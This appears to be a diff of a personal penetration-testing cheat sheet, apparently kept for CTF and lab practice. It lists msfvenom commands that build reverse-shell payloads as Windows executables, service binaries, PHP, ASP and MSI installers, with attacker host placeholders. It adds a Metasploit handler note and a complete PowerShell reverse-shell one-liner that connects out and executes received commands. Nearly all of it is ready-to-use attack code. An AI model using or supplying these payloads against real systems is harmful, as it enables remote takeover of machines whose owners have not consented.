@@ -10,24 +10,28 @@ ssh -p 2220 bandit18@bandit.labs.overthewire.org -t "cat /home/bandit18/readme"
 rlwrap nc -lvnp 1234
 ```
 
-## msfvenom
-### meterpreter
-`msf6 > use exploit/multi/handler `
-Windows  
+## msfvenom payload
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
-```  
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+```
+service
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+```
 PHP  
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
-```  
+```
 ASP  
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
 ```
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
 ```
+### meterpreter
+`msf6 > use exploit/multi/handler `
+replace `windows/x64/shell_reverse_tcp` by `windows/meterpreter/reverse_tcp`
 ## _reverse shell from the remote server_
 ```
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
